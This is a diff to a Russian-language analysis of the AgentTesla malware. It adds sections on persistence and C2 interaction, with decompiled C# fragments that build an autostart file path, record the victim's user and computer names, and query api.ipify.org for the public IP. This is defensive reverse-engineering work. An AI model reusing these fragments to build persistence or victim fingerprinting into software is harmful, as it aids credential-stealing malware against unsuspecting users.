@@ -163,7 +163,7 @@ AgentTesla — это тип вредоносного ПО, известный �
 			```csharp
 			text = fHfXQzVTqo.ouKT(MD5.Create(), fHfXQzVTqo.wENtroM1A() + fHfXQzVTqo.gwVUs7kYe() + fHfXQzVTqo.kz1WOlEk7TS());
 			```
-	1. Получение пути к загруженному файлу сборки 
+	1. Настройка автозагрузки 
 	   - Получение пути к загруженному файлу сборки 
 		```csharp
 	   Stu4Un2.AsmFilePath = Assembly.GetExecutingAssembly().Location;
@@ -172,6 +172,29 @@ AgentTesla — это тип вредоносного ПО, известный �
 	   ```csharp
 	    Stu4Un2.StartupDirectoryPath = Path.Combine(Environment.GetEnvironmentVariable(Stu4Un2.StartupEnvName), Stu4Un2.StartupDirectoryName);
 		```  
+		- Получение полного пути к файлу автозапуска 
+		```csharp
+		Stu4Un2.AppStartupFullPath = Path.Combine(Stu4Un2.StartupDirectoryPath, Stu4Un2.StartupInstallationName);
+		```
+		
+	1. Взаимодействие с C2
+		-  Формирование строки "ИмяПользователя/ИмяКомпьютера"
+		```csharp
+			Stu4Un2.ThisComputerName = SystemInformation.UserName + "/" + SystemInformation.ComputerName;
+		```
+		- Создание и настройка веб-запроса
+			- Выполняется GET-запрос к "https://api.ipify.org", и возвращает содержимое ответа в виде строки. Если запрос успешен и сервер вернул статус "OK", то возвращается тело ответа. В противном случае возвращается пустая строка.
+		```csharp
+		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Stu4Un2.IpApi);
+		httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
+		httpWebRequest.KeepAlive = true;
+		httpWebRequest.Timeout = 10000;
+		httpWebRequest.AllowAutoRedirect = true;
+		httpWebRequest.MaximumAutomaticRedirections = 50;
+		httpWebRequest.Method = "GET";
+		httpWebRequest.UserAgent = Stu4Un2.PublicUserAgent;
+		```
+
 ## Цепочка заражения
 Placeholder
 ## Indicators of Compromise
